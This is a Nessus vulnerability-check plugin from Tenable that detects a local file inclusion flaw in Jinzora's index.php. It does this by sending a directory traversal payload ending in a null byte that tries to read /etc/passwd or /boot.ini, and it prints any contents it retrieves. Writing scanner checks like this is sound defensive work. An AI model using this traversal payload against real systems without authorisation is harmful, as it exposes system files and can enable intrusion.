#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36102);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(34224);
  script_xref(name:"milw0rm", value:"8278");
  script_xref(name:"OSVDB", value:"52858");
  script_xref(name:"Secunia", value:"34448");

  script_name(english:"Jinzora name Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is affected by a\n",
      "local file include vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running Jinzora, a web-based media streaming and\n",
      "management system written in PHP.\n",
      "\n",
      "The version of Jinzora installed on the remote host fails to filter\n",
      "user-supplied input to the 'name' variable in the 'index.php' script\n",
      "when 'op' is set before using it to include PHP code. Regardless of\n",
      "PHP's 'register_globals' setting, an unauthenticated attacker can\n",
      "exploit this issue to view arbitrary files or possibly to execute\n",
      "arbitrary PHP code on the remote host, subject to the privileges of\n",
      "the web server user id."
    )
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

traversal = crap(data:"../", length:3*9) + '..';

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/jinzora", "/jukebox", cgi_dirs()));
else dirs = make_list(cgi_dirs());

# nb: catch CMS installs too.
dirs = make_list(dirs, "/modules/jinzora");

foreach dir (dirs)
{
  # Unless we're paranoid, make sure we're looking at Jinzora.
  if (report_paranoia < 2)
  {
    url = string(dir, "/index.php");
    res = http_get_cache(item:url, port:port);
    if (isnull(res)) exit(0);

    if (
      "jinzora-settion=" >!< res &&
      'class="jz_submit"' >!< res
    ) continue;
  }

  # Loop through files to look for.
  foreach file (files)
  {
    url = string(
      dir, "/index.php?",
      "op=1&",
      "name=", string(traversal, file, "%00")
    );

    # Try to exploit the issue.
    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];
    if (egrep(pattern:file_pat, string:body))
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          report += string(
            "\n",
            "Here are its repeated contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            body,
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
